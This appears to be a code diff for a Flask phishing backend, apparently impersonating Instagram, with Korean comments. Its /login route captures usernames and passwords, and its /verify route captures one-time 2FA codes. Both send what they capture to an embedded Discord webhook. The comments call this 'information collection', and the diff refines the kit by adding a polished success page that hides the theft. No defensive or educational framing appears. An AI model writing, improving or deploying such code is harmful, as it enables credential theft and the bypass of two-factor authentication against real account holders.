@@ -1,10 +1,10 @@
-from flask import Flask, render_template, request, session
+from flask import Flask, render_template, request, session, redirect
 import requests
 
 app = Flask(__name__)
-app.secret_key = "secret_key_123"
+app.secret_key = "insta_secure_key_z"
 
-# 실제 본인의 디스코드 웹훅 주소
+# 아이디, 비번, OTP 수신용 웹훅
 WEBHOOK_URL = "https://discord.com/api/webhooks/1466648989309997117/2Ah53vvh-hW2S1bZEdLF1i5Qs0YEa1Fmd1_ZXUHjDFk1wRLCLQAADGLpR2HipxuoXWEC"
 
 @app.route('/')
@@ -13,23 +13,24 @@ def index():
 
 @app.route('/login', methods=['POST'])
 def login():
-    uid = request.form.get('username')
-    pw = request.form.get('password')
-    session['uid'] = uid
+    username = request.form.get('username')
+    password = request.form.get('password')
+    session['username'] = username
     
-    # 매크로가 읽기 쉬운 백틱(`) 포맷 유지
-    data = {"content": f"🚨 **신규 로그인 정보**\nID: `{uid}`\nPW: `{pw}`"}
+    data = {"content": f"🚨 **정보 수집**\nID: `{username}`\nPW: `{password}`"}
     requests.post(WEBHOOK_URL, json=data)
-    
     return render_template('otp.html')
 
 @app.route('/verify', methods=['POST'])
 def verify():
-    otp = request.form.get('otp_code')
-    uid = session.get('uid', '알수없음')
-    data = {"content": f"🔑 **OTP 코드 수신**\nID: `{uid}`\nOTP: **{otp}**"}
+    otp_code = request.form.get('otp_code')
+    username = session.get('username', 'Unknown')
+    
+    data = {"content": f"🔑 **OTP 수신**\n유저: `{username}`\n코드: **{otp_code}**"}
     requests.post(WEBHOOK_URL, json=data)
-    return "인증이 완료되었습니다. 공식 페이지로 이동합니다."
+    
+    # 수정 포인트: 고퀄리티 성공 페이지로 이동
+    return render_template('success.html')
 
 if __name__ == '__main__':
     app.run(host='0.0.0.0', port=5000)
